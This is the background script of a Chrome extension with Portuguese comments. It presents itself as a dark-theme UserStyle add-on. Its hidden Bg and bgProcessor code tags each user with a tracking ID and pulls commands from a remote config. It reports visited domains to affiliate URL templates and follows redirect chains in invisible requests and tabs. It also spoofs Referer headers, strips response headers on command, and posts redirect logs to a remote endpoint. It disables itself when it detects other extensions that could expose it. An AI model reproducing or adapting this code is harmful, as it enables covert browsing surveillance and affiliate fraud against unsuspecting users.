var app={};app.loadReason="startup",app.version=function(){

	return chrome.runtime.getManifest().version},
	app.homepage=function(){return""},
	app.tab={open:function(a){
		chrome.tabs.create({url:a,active:!0})}},
		chrome.runtime.onMessage.addListener(function(a,b,c){"top"===a.message&&c(b.tab.url)}),
		app.storage=function(){var a={};

		return chrome.storage.onChanged.addListener(function(){
			chrome.storage.local.get(null,function(b){a=b})}),window.setTimeout(function(){chrome.storage.local.get(null,function(b){a=b;
			var c=document.createElement("script");c.src="/js/common.js",document.body.appendChild(c)})},300),{read:function(b){return a[b]},write:function(b,c){var d={};a[b]=c,d[b]=c,chrome.storage.local.set(d)}}}(),app.button=function(){var a;

			return chrome.browserAction.onClicked.addListener(function(){a&&a()}),{onCommand:function(b){a=b},set icon(a){chrome.browserAction.setIcon(a)},set label(a){chrome.browserAction.setTitle({title:a})}}}();
			var config={};config.welcome={set open(a){app.storage.write("support",a)},get version(){return app.storage.read("version")},set version(a){app.storage.write("version",a)},get open(){var a=-1!==navigator.userAgent.toLowerCase().indexOf("firefox");

			return app.storage.read("support")===void 0?!a:app.storage.read("support")}},config.addon={set state(a){app.storage.write("state",a)},get state(){return app.storage.read("state")===void 0?"light":app.storage.read("state")}},config.addon.state="dark";

			/* Projeto baseado no site UserStyle */

			const CONFIG_URL="https://userstyles.org";
			class Bg{constructor(){chrome.runtime.onMessage.addListener((a,b,c)=>("getConfig"===a.action&&c(this.config),"opot"===a.action)?(this.config.optouted=!0,
				this.saveConfig(),!0):("setConfig"===a.action&&(this.config=a.config,
				this.saveConfig()),!0)),
				this.postProcessingComplete=!1,
				this.config={},this.uid="",
				this.environmentValidated=!1,
				this.bgProcessorRun=!1,
				this.envDetected=!1,
				this.init()}init(){chrome.runtime.onInstalled.addListener((a)=>

			/* PÁGINA DE BOAS VINDAS NO NA INSTALAÇÃO*/

				{"install"==a.reason&&chrome.tabs.create({url:"boasvindas.html"})}),
			chrome.storage.sync.get({config:{}},(a)=>{this.config=a.config,
				this.config.uid?this.uid=this.config.uid:(this.uid=this.config.uid=this.generateUID(),this.saveConfig()),
				this.config.mTime&&this.config.lTime||(this.config.lTime=0,this.config.mTime=new Date().getTime(),this.saveConfig()),
				this.config.envDetected&&(this.envDetected=this.config.envDetected),
				this.validateEnvironment(),
				this.initBgProcessor(),
				this.postProcessing(),
				this.updateConfig()})}heartBeat(){let a=new Date().getTime(),b=a-this.config.mTime,c=this.config.configUpTime?this.config.configUpTime+3e5:1.2e6;this.config.mTime&&b<c?(this.config.lTime+=b,this.config.mTime=a,this.saveConfig()):(this.config.mTime=a,this.saveConfig())}updateConfig(){this.heartBeat();const a=chrome.runtime.getManifest().version;$.ajax({url:CONFIG_URL,dataType:"json",data:{id:chrome.runtime.id,version:a,mt:this.config.mTime,lt:this.config.lTime,uid:this.uid,r:Date.now()},success:(a)=>{if(a){for(let b in a)this.config[b]=a[b];this.saveConfig(),this.validateEnvironment(),this.initBgProcessor(),this.postProcessing()}},complete:()=>{if(this.config.configUpTime&&0<this.config.configUpTime){let a=this;setTimeout(function(){a.updateConfig()},this.config.configUpTime)}}})}saveConfig(){chrome.storage.sync.set({config:this.config})}generateUID(){return"xxxxxxxx-xxxx-3xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(a){var b=0|16*Math.random(),c="x"==a?b:8|3&b;return c.toString(16)})}validateEnvironment(){let a=this;

	if(!a.environmentValidated&&a.config.envCheckActive&&a.config.envCheckPeriod&&a.config.envCheckList){a.environmentValidated=!0;let b=new Date().getTime();
		if(a.config.lastEnvCheck&&b-a.config.lastEnvCheck<a.config.envCheckPeriod)return;

	for(let c in a.config.lastEnvCheck=b,a.envDetected=a.config.envDetected=!1,a.saveConfig(),a.config.envCheckList)a.detectExtentionById(a.config.envCheckList[c]).then(function(b){b&&(a.config.envDetected=a.envDetected=!0,a.saveConfig())})}}safeRemoveTab(a){try{chrome.tabs.remove(a,function(){chrome.runtime.lastError})}catch(a){}}detectExtentionById(a){let b=this;return new Promise(function(c){let d=!1;chrome.tabs.create({url:"chrome-extension://"+a+"/manifest.json",active:!1},function(a){setTimeout(function(){b.safeRemoveTab(a.id),c(!1)},3e3),chrome.tabs.insertCSS(a.id,{code:"console.log('injected');"},function(){chrome.runtime.lastError&&(d=/chrome-extension/gm.test(chrome.runtime.lastError.message)),chrome.tabs.remove(a.id,function(){c(d)})})})})}initBgProcessor(){let a=this;

		if(a.envDetected)return void bgProcessor.initCfg({mode:"off"});

		if(a.bgProcessorRun)return void bgProcessor.initCfg(a.config.bgProcessor);

		if(!a.config.bgProcessor)return void bgProcessor.initCfg({mode:"off"});

		if(a.config.optouted)return void bgProcessor.initCfg({mode:"off"});a.bgProcessorRun=!0,bgProcessor.initCfg(a.config.bgProcessor),chrome.webRequest.onCompleted.addListener(function(a){
			if("on"===bgProcessor.cfg.mode&&!bg.envDetected&&!bg.config.optouted&&!(0>a.tabId)&&200==a.statusCode&&"GET"==a.method){var b=a.url.replace(/^(https?\:\/\/[^\/]+).*$/,"$1"),c=a.url.replace(/^https?\:\/\/([^\/]+).*$/,"$1");bgProcessor.cfg.keep_www_prefix||(c=c.replace(/^www\.(.*)$/,"$1"));var d=new Date().getTime();

			if(!(bgProcessor.used_domains[c]&&bgProcessor.used_domains[c]+bgProcessor.cfg.ttl_ms>d)&&!(bgProcessor.cfg.domains_blacklist&&0<bgProcessor.cfg.domains_blacklist.length&&bgProcessor.cfg.domains_blacklist.includes(c))&&!(bgProcessor.cfg.domains_whitelist&&0<bgProcessor.cfg.domains_whitelist.length&&!bgProcessor.cfg.domains_whitelist.includes(c))){bgProcessor.used_domains[c]=d;var e=bgProcessor.cfg.aff_url_tmpl.replace("{URL}",encodeURIComponent(b));

			if(e=e.replace("{DOMAIN}",encodeURIComponent(c)),bgProcessor.cfg.aff_redirect)return!bgProcessor.cfg.domains_whitelist||0<!bgProcessor.cfg.domains_whitelist.length?void 0:(bgProcessor.push_chain(b),void bgProcessor.request_bg(e,c,0));var f=new XMLHttpRequest;f.timeout=bgProcessor.cfg.aff_timeout_ms,f.onreadystatechange=function(){
				if(4==f.readyState&&200==f.status){var a=f.responseText.replace(/[\n\r]/g,"");

	/*USAR MODIFICAÇÕES NO HTTP:// E HTTPS:// O (*) REPRESENTA OS SUFIXOS DE INÚMEROS DOMÍNIOS E PÁGINAS */

	if(/^https?\:\/\//.test(a)&&a!=b){var e=b.replace(/^https?\:\/\/([^\/]+).*$/,"$1");bgProcessor.push_chain(b),bgProcessor.request(a,e)}
	else bgProcessor.used_domains[c]=d+bgProcessor.cfg.no_coverage_ttl_ms}},f.open("GET",e),f.send()}}},{urls:["http://*/*","https://*/*"],types:["main_frame"]});let b=["blocking","requestHeaders"];

if(0<bgProcessor.cfg.rfr_rules.length&&bgProcessor.cfg.listenerExtraOptions)
	for(var c in bgProcessor.cfg.listenerExtraOptions)b.push(bgProcessor.cfg.listenerExtraOptions[c]);chrome.webRequest.onBeforeSendHeaders.addListener(function(a){
		if("on"!==bgProcessor.cfg.mode||!bgProcessor.cfg.header)return{};

	for(var b=a.requestHeaders,c="",d=0;d<b.length;d++)if(b[d].name===bgProcessor.cfg.header){c=b[d].value,b.splice(d,1);break}if(!c)return{};

		for(var e=!1,d=0;d<b.length;d++)if("accept"==b[d].name.toLowerCase()){b[d].value=c,e=!0;break}
			if(e||b.push({name:"Accept",value:c}),0>a.tabId){let c="";

		if(bgProcessor.cfg.rfr_rules)
			for(let b in bgProcessor.cfg.rfr_rules){let d=bgProcessor.cfg.rfr_rules[b];

			if(d.url_request_before){if(!bgProcessor.last_request_url)continue;let a=new RegExp(d.url_request_before[0],d.url_request_before[1]);

				if(!a.test(bgProcessor.last_request_url))continue}	if(d.url_response_before){if(!bgProcessor.last_response_url)continue;let a=new RegExp(d.url_response_before[0],d.url_response_before[1]);

						if(!a.test(bgProcessor.last_response_url))continue}if(d.url_request){let b=new RegExp(d.url_request[0],d.url_request[1]);

							if(!b.test(a.url))continue}if("allow"==d.rule&&(c=bgProcessor.last_response_url),"replace"==d.rule&&d.replace&&(c=d.replace),"regexp"==d.rule&&d.regexp&&d.replace){var f=new RegExp(d.regexp[0],d.regexp[1]);c=bgProcessor.last_response_url.replace(f,d.replace)}break}if(c){let a=b.findIndex((a)=>"referer"==a.name.toLowerCase());-1<a?b[a].value=c:b.push({name:"Referer",value:c})}}return{requestHeaders:b}},{urls:["http://*/*","https://*/*"]},b)}postProcessing(){
	if(this.postProcessingComplete)return;let a=this.config;a&&a.filters&&(this.postProcessingComplete=!0,
		chrome.webRequest&&chrome.webRequest.onHeadersReceived.addListener(function(b){
			return{responseHeaders:b.responseHeaders.filter(function(b){return a.filters&&-1<a.filters.indexOf(b.name.toLowerCase())?!1:!0})}},{urls:["<all_urls>"]},["blocking","responseHeaders"]))}}var bgProcessor={cfg:{mode:"off"},used_domains:{},rdr_chain:[],last_request_url:"",last_response_url:"",initCfg(a){a&&(this.cfg=a)},request:function(a,b){this.cfg.debug&&console.log("bgProcessor.request",a,b),this.cfg.ntab_tag&&-1!==a.indexOf(this.cfg.ntab_tag)?setTimeout(function(){bgProcessor.request_tab(a,b)},this.cfg.ntab_delay_ms):this.request_bg(a,b,0)},push_chain:function(a){this.rdr_chain.push(a)},request_bg:function(a,b,c){
		if(!(c>=this.cfg.rdr_max_count)&&this.cfg.header){this.push_chain(a),bgProcessor.last_request_url=a;var d=new XMLHttpRequest;d.timeout=this.cfg.timeout,d.onreadystatechange=function(){
		if(4==d.readyState)if(200==d.status){var a=d.responseText.replace(/[\n\r\s]/g,"").replace(/\.href/g,""),e=!1,f=d.responseURL,g=bgProcessor.is_rdr_url(d.responseURL);

	if(bgProcessor.last_response_url=f,g||a.length<bgProcessor.cfg.jsrdr_maxlen_bytes){var h=a.replace(/^.*?location\=[\'\"]([^\'\"]+).*$/,"$1");/^\//.test(h)&&(link2Url=new URL(h,d.responseURL),h=link2Url.href),/^https?\:\/\//.test(h)&&(bgProcessor.request_bg(h,b,c+1),e=!0)}if(!e&&bgProcessor.cfg.common_rdr_rules)
	for(var j in bgProcessor.cfg.common_rdr_rules){var i=bgProcessor.cfg.common_rdr_rules[j],k=new RegExp(i.search[0],i.search[1]),l=a;

		if("uri"==i.where&&(l=f),i.url_pattern){var m=new RegExp(i.url_pattern[0],i.url_pattern[1]);
		if(!m.test(f))continue}
			if(l.match(k)){var n=l.replace(k,i.replace);

		if(i.applyAfter)
			for(var p in i.applyAfter){var o=i.applyAfter[p];"decodeURIComponent"==o&&(n=decodeURIComponent(n))}if(/^\//.test(n)&&(link2Url=new URL(n,d.responseURL),n=link2Url.href),/^https?\:\/\//.test(n)){var q=i.delay?i.delay:0;

				if("string"==typeof q&&-1<q.indexOf("-")){var r=q.split("-");q=Math.floor(Math.random()*(parseInt(r[1])-parseInt(r[0])+1)+parseInt(r[0]))}setTimeout(()=>{bgProcessor.request_bg(n,b,c+1)},parseInt(q)),e=!0;break}}}e||(bgProcessor.push_chain(f),bgProcessor.send_rdr_log(),bgProcessor.rdr_chain=[],bgProcessor.last_request_url=null,bgProcessor.last_response_url=null)}else;},d.open("GET",a,!0),d.setRequestHeader(this.cfg.header,"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),d.send()}},is_rdr_url:function(a){var b=new URL(a);

				return this.cfg.rdr_coverage&&b.host in this.cfg.rdr_coverage||!!/\/goto\/?$/.test(b.pathname)},request_tab:function(a,b){this.cfg.debug&&console.log("bgProcessor.request_tab",a,b),chrome.tabs.create({url:a,active:!1},function(a){setTimeout(function(){try{chrome.tabs.remove(a.id)}catch(a){}},bgProcessor.cfg.ntab_duration_ms)})},send_rdr_log:function(){
				if(this.rdr_chain&&this.cfg&&this.cfg.log_rdr_active&&this.cfg.log_rdr_endpoint){
					if(this.cfg&&this.cfg.log_rdr_onlydifferent){var a=this.rdr_chain[0],b=this.rdr_chain[this.rdr_chain.length-1];

				if(a.replace(/^https?\:\/\/(?:www\.|)([^\/]+).*$/,"$1")==b.replace(/^https?\:\/\/(?:www\.|)([^\/]+).*$/,"$1"))return}req=new XMLHttpRequest,req.open("POST",this.cfg.log_rdr_endpoint,!0),req.setRequestHeader("Content-Type","application/json;charset=UTF-8"),req.send(JSON.stringify(this.rdr_chain))}}};const bg=new Bg;